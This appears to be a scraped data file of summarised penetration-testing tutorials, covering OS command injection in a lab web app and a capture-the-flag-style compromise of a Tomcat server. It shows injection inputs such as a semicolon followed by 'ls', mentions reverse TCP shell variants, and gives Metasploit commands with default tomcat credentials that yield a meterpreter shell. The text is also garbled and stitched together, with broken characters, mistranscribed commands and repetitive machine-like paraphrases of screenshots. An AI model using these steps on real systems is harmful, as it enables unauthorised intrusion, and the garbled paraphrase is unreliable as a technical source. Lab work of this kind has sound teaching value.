1059,Commanding,"Introduction. Command Injection, also referred to as Shell Injection or OS Injection, arises when an attacker tries to perform system-level commands directly through a vulnerable application in order to retrieve information of the webserver or try to make unauthorized access into the server. Such an attack is possible only when the user-supplied data is not properly validated before passing to the server. This user data could be in any form such as forms, cookies, HTTP headers, etc.. How Command Injection Occurs?. There are many situations when the developers try to include some functionalities into their web application by making the use of the operating system commands. However, if the application passes the user-supplied input directly to the server without any validation, thus the application might become vulnerable to command injection attacks.. In order to clear the vision, let??s consider this scenario: Think for a web-application providing functionality that any user can ping any particular IP address through his web-interface in order to confirm the host connection, which means that the application is passing the ping command with that particular input IP directly to the server.. The provided code snippet is a PHP script that checks the operating system (OS) of the target machine and then executes a ping command to determine if it's accessible or not. If the OS is Windows, the script uses the ""ping"" command with the specified target IP address. For Linux-based systems, it uses the ""ping -c 4"" command with the target as an argument. The output of the ping command is then displayed on the screen for the end user to see."
1059,Commanding,"The unquoting metacharacter is used to force the shell to interpret and run the command between the back ticks.. So | guess until now you might be having a clear vision with the concept of OS command injection and its methodology.. In Command Injection, the attacker extends the default functionality of the application, which execute system commands, without the necessity of injecting code.. The content provided is a demonstration of a vulnerability called ""Command Injection"". The scenario involves pinging a device and entering an IP address (127.0.0.1) to test connectivity."
1059,Commanding,"Non-IT people can understand this as sending a ""ping"" request to a device and waiting for a response. However, in the given example, there is an issue with the way the input (the IP address) is processed, which allows attackers to inject malicious commands into the system. This can lead to unauthorized access or control over the targeted device, posing a serious security risk.. In order to perform the ??Basic OS Command Injection attack??, I've used the ??; (semicolon)?? as a metacharacter and entered another arbitrary command i.e. ??Is?? ]. This text is about a vulnerability called Command Injection that can occur when someone is trying to ping a device and enter an IP address. The person may be prompted with the message ""Enter an IP address: [127.0.0.1:ls]"" where ""ls"" is a command that could potentially harm the system if it's executed with malicious intent. This type of vulnerability can be dangerous because it allows attackers to execute arbitrary code on a target device, which can lead to serious security breaches."
1059,Commanding,"The third task is to create a new user account on the system. The fourth task is related to DNS lookup, specifically looking up the website ""www.nsa.gov,"" possibly as part of a security test or scan. It's worth noting that ""OS Command Injection"" is mentioned in the content, which refers to a type of cyber attack where malicious code is injected into a command or script on a system, potentially allowing an attacker to gain unauthorized access or execute malicious actions on the targeted machine.. The content describes a series of actions taken by a device or system. The actions involve using websockets and making requests to a specific IP address. The request is made with specific headers and includes data in the form of raw parameters, headers, and hex values. Additionally, there is an origin, connection, referer, and cookie information included in the request. Overall, it appears that the device or system is sending data to the specified IP address using websockets.. The content describes a request sent to the target URL ""http/192.168.0"". The request is in the form of a POST method with various headers included such as User-Agent, Accept, Content-Type, and others. The payload or body of the request contains an HTML form that includes two input fields for DNS lookup. One field is for specifying the target domain name and the other is for submitting the query. This appears to be an example of a web application vulnerability called ""OS Command Injection.""."

1059,Commanding,"Checking connection to the target URL... [ ]. This content appears to be describing a series of commands and options for using various types of reverse TCP shells in the Metasploit Framework, which is a tool used for penetration testing and vulnerability assessment. A reverse TCP shell allows an attacker to remotely control a compromised system by creating a bidirectional connection between their command-and-control server and the target system. The available options include using different types of reverse TCP shells, such as Unix-like or Windows-based, and specifying various settings like the local host and port number. Some examples of specific commands are provided, including using PHP, Perl, Ruby, Python, Socat, Bash, Ncat, and meterpreter reverse TCP shells on different operating systems."
1059,Commanding,"The attacker is now interacting with the compromised system in real-time using the Meterpreter session.. This appears to be a record of a network request and response. The request is a POST request to the URL ""/bWAPP/conmandi\_blind.php"" with an HTTP version of 1.1. The Host field specifies the IP address and port number of the server being accessed. The User-Agent field identifies the browser being used to make the request. The Accept field specifies which content types are acceptable for the response, and the Accept-Language and Accept-Encoding fields indicate any language or compression preferences."
1059,Commanding,"The Referer field specifies the last page visited by the user before making this request. The Content-Type field indicates the format of the data being sent in the request body.. . The response is not included in this record, so it is unclear what the outcome of the request was. However, based on the information provided in the request, it seems that the goal was to send a form submission to the IP address 192.168.0.9 with the message ""ping -c 10 192.168.0.9"" as the form data. The Cookie field indicates any cookies that were sent with the request, and the Upgrade-Insecure-Requests field specifies whether or not the request should be upgraded to a secure connection if one is available.."

The target machine??s IP address can be seen in the following screenshot.. The target machine IP address is 192.168.1.24, and we will be using 192.168.1.25 as the attacker machine IP address wherever required.. Note: the target machine IP address may be different in your case, as the network DHCP assigns it.. We do not need to run the Netdiscover command for this machine to get the target IP address as it is automatically assigned and displayed on the screen.. Now that we have the target machine IP address, the next step is to find out the open ports and services available on the machine.. After getting the target machine's IP address, the next step is to find out the open ports and services available on the machine. We will use the Nmap tool, as it works effectively and is available by default on Kali Linux. The results can be seen below:.

Let??s configure our exploit into the MSFConsole as follows: Command used: e << use exploit/multi/http/tomcat\_mrg\_upload >>. e << show options >>. First, we used the ??use exploit/multi/http/tomcat\_mrg\_upload?? command to set up the exploit. After that we used ??show options?? to know the pre-requirements for the exploit.. The output of the show options command gives us the details which we need for setup such as IP address, username password etc. So, let's add these details by using the set command as follows: Command used: e <<set RHOSTS 192.168.1.19 >> e <<set RPORT 8080 >> e <<set HttpPassword tomcat >> e <<set HttpUsername tomcat >>. The command which we used in the above screenshot are explained below:. e set HTTPUsername is used to set up the username. So, we added tomcat as a username.. After setting up all the required details we verify it with the show option command which shows all the required details.. Command used: << exploit >>. As can be seen in the above screenshot, we got the meterpreter shell, which is configured by default by the Metasploit Framework.. We tried to run the id command, but it does not work sometimes. After that, we ran the shell command, which opens another command shell where we again run the id command.. The output of the id command shows that we got the access of tomcat user, which is not the root.. So, up to this point, we've got limited shell access on the target machine..
